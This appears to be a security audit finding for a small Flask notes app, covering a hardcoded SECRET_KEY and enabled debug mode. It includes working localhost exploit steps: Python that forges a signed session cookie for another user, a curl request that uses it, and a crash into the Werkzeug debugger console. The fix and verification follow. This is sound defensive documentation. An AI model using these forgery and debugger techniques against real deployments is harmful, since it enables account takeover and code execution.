# Hardcoded SECRET_KEY and debug mode enabled

**OWASP category:** A05:2021 Security Misconfiguration
**CWE:** CWE-798 Use of Hard-coded Credentials, CWE-489 Active Debug Code
**Location:** `app/__init__.py`, `run.py`

## The vulnerability

Two related misconfigurations, both committed straight to source control:

```python
# app/__init__.py
SECRET_KEY = "dev-secret-do-not-use-in-prod-12345"
...
app.config["SECRET_KEY"] = SECRET_KEY
```

```python
# run.py
app.run(debug=True)
```

Flask signs session cookies with `SECRET_KEY` using itsdangerous. If that key is fixed and
public (as it is the moment this repo is on GitHub), anyone can mint a validly-signed
session cookie for any user id without ever knowing a password. Separately, `debug=True`
turns on the Werkzeug interactive debugger, which drops an in-browser Python console on
any unhandled exception, which is arbitrary code execution for anyone who can trigger a
crash.

## Exploit

### 1. Forging a session with the hardcoded key

Using only the key visible in the public source, and Flask's own session serializer, mint
a cookie for `user_id=1` (alice) without registering or logging in at all:

```
$ python3 - <<'EOF2'
from app import create_app
app = create_app()
with app.app_context():
    from flask.sessions import SecureCookieSessionInterface
    signer = SecureCookieSessionInterface().get_signing_serializer(app)
    print(signer.dumps({"user_id": 1}).decode())
EOF2
eyJ1c2VyX2lkIjoxfQ.aqlT-A.cv97bm_cl5fNhODEdNPIDesr4OE

$ curl --cookie "session=eyJ1c2VyX2lkIjoxfQ.aqlT-A.cv97bm_cl5fNhODEdNPIDesr4OE" \
    http://127.0.0.1:5000/notes
<h1>alice's notes</h1>
```

A brand-new client that has never touched `/register` or `/login` is fully authenticated
as alice.

### 2. Crashing into the debugger

The SQL injection bug (`03-sql-injection-login.md`) also lets a malformed payload raise an
unhandled `sqlite3.OperationalError`. With `debug=True`, that turns into a live console:

```
$ curl --data-urlencode "username=o'brien" --data-urlencode "password=x" \
    http://127.0.0.1:5000/login
< HTTP/1.1 500 INTERNAL SERVER ERROR

$ grep -o "Werkzeug Debugger" response.html
Werkzeug Debugger
```

The response is Werkzeug's interactive traceback page. From there, an attacker who can
also see the debugger PIN (logged to stdout on this dev server, sometimes recoverable by
other means in real deployments) gets a Python prompt running inside the application
process.

## Fix

`SECRET_KEY` now comes from an environment variable, falling back to a value generated
fresh per process rather than a fixed string:

```python
app.config["SECRET_KEY"] = os.environ.get("SECRET_KEY") or secrets.token_hex(32)
```

`run.py` only turns debug mode on if `FLASK_DEBUG=1` is explicitly set:

```python
app.run(debug=os.environ.get("FLASK_DEBUG") == "1")
```

## Verification

Two separate app instances now get two different, unpredictable keys, so there is no
fixed value left in the repository to forge a cookie against:

```
$ python3 -c "
from app import create_app
print(create_app().config['SECRET_KEY'])
print(create_app().config['SECRET_KEY'])
"
2fbdbb5f6fc6b9bcd7cb34550f1b7a849ecc8cf1caeb0db78999e4ca88c34ea2
d594903859328303ff561ca8807f7ddfdaf8dadae906b7a48df0539cef582e7d
```

And the same crash payload no longer raises an exception at all, because the SQL
injection fix in `03-sql-injection-login.md` made it a parameterized, non-crashing query;
debug mode being off means even a genuine unhandled exception elsewhere would now render a
generic error page instead of an interactive console.
